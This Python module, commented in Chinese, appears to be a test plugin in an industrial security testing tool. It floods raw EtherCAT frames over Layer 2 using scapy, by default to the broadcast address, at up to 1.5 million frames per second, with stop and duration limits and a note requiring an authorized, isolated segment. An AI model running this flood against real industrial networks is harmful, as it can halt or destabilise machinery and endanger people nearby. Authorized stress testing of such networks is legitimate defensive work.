"""
測項：EtherCAT Raw Ethernet Frame 注入
分類：EtherCAT（Layer 2，EtherType 0x88A4）

重要限制：
  - 這是 Layer 2 原始乙太網路框架注入，不透過 IP 定址，而是直接指定「網路介面 iface」。
    因此本測項的 target 欄位僅供記錄用途（例如記錄受測產線/網段名稱），實際發送對象
    由 dst_mac 決定，操作者需確保是在受測、已授權的實體/隔離網段上執行。
  - 送出迴圈受 duration + stop_event 控制、並以 RateLimiter 控速，確保測試可預期地
    結束與被中止，不會無限期送出。
需求：scapy、且需要 root 或 CAP_NET_RAW 權限。
"""
import time

from ..common import RateLimiter, clamp_duration

NAME = "EtherCAT Raw Frame 注入"
CATEGORY = "EtherCAT"
PROTOCOL = "L2"
TEST_TYPE = "traffic"  # 流量型：原始 L2 訊框注入洪水，靠封包速率本身造成負擔


def get_param_schema() -> dict:
    return {
        "iface": {"type": "string", "default": "eth0", "desc": "發送用網路介面"},
        "dst_mac": {"type": "string", "default": "ff:ff:ff:ff:ff:ff", "desc": "目的 MAC（廣播或指定 Slave MAC）"},
        "rate_pps": {"type": "int", "default": 1500000, "min": 1, "max": 1500000, "desc": "每秒送出訊框數"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import Ether, Raw, sendp
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"frames_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    iface = params.get("iface", "eth0")
    dst_mac = params.get("dst_mac", "ff:ff:ff:ff:ff:ff")
    rate = int(params.get("rate_pps", 6000))

    pkt = Ether(dst=dst_mac, type=0x88A4) / Raw(
        load=b"\x10\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    )
    limiter = RateLimiter(rate)
    sent = 0
    start = time.time()

    log_fn(f"[+] 注入 EtherCAT frame -> iface={iface}, dst={dst_mac}, {rate}pps, {duration}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
        except (PermissionError, OSError, ValueError) as e:
            # 一併攔截 ValueError：scapy 在 iface 參數指向不存在的網路介面時會丟出
            # 這個例外類型，統一在此攔截並輸出清楚的錯誤訊息，避免原始 traceback 外洩。
            log_fn(f"[!] 發送失敗（權限、介面問題或介面名稱不存在）：{e}")
            break

    return {"frames_sent": sent, "elapsed_sec": round(time.time() - start, 1)}
